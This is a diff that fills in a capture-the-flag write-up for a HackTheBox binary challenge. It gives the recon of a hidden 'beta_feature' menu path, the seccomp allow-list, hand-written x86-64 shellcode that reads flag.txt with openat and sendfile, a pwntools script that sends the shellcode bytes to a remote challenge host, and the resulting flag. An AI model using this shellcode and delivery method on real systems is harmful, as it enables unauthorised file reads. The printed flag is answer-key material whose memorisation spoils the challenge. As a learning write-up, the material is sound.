@@ -6,6 +6,8 @@
 
 * Description
 * Recon
+Opening the provided binary in [[id:ed95b5a1-25d6-4c63-91f8-11a818a96416][Ghidra]] reveals a switch case in the ~menu~ function that accepts input 9 to access a hidden ~beta_feature~ function. From there, the function calls to ~skid_check~ which appears to execute provided shellcode.
+
 * Foothold
 In the ~skid_check~ function, a sandbox is configured using [[id:0d128e60-3469-4ba2-a8c6-ea8c7961809a][seccomp]]. The sandbox is initialized to ~SCMP_ACT_KILL~ (0) and only 5 syscalls are allowed:
 - 0xf - 15 - ~sys_getgroups~
@@ -13,3 +15,50 @@ In the ~skid_check~ function, a sandbox is configured using [[id:0d128e60-3469-4
 - 0x3c - 60 - ~sys_exit~
 - 0xe7 - 231 - ~sys_exit_group~
 - 0x101 - 257 - ~sys_openat~
+
+The shellcode to be created will use ~sys_openat~ and ~sys_sendfile~ to read and write the flag. The shellcode must also be under 60 bytes in length.
+
+#+begin_src asm
+global _start
+section .text
+_start:
+    xor rax, rax                ; set rax to 0
+    push rax
+    mov ax,257                  ; sys_openat
+                                ; we need 2 bytes to represent 257.
+                                ; using al will overflow
+                                ; ax is for byte 0-1 (2 bytes).
+    mov rdi,-100                ; dirfd (-100 is AT_FDCWD)
+    mov r8, "flag.txt"
+    push r8
+    lea rsi,[rsp]
+    xor rdx,rdx                 ; flag O_APPEND
+    syscall
+
+    mov rsi,rax                 ; save the returned fd
+    xor rax, rax                ; set rax to 0
+    mov al,0x28                 ; sys_sendfile
+    xor rdi, rdi                ; set rdi to 0
+    mov dil,0x1                 ; set rdi to fd 1 (stdout)
+    xor rdx,rdx                 ; 0 offset
+    mov r10b,255                  ; size_t_count
+    syscall
+#+end_src
+
+The above code results in a binary with no null bytes and is of length 58 bytes.
+
+The shellcode can then be delivered using [[id:584a53ed-edbe-46fe-9d38-df00a0eb71b0][pwntools]]:
+#+begin_src python
+from pwn import *
+shellcode = b"\x48\x31\xc0\x50\x66\xb8\x01\x01\x48\xc7\xc7\x9c\xff\xff\xff\x49\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x41\x50\x48\x8d\x34\x24\x48\x31\xd2\x0f\x05\x48\x89\xc6\x48\x31\xc0\xb0\x28\x48\x31\xff\x40\xb7\x01\x48\x31\xd2\x41\xb2\xff\x0f\x05"
+io = connect('134.209.17.29', 31069)
+io.recvuntil(b"do? ")
+io.sendline(b"9")
+io.sendline(shellcode)
+print(io.recvall())
+#+end_src
+
+* Flag
+#+begin_example
+HTB{backd00r_as_a_f3atur3}
+#+end_example
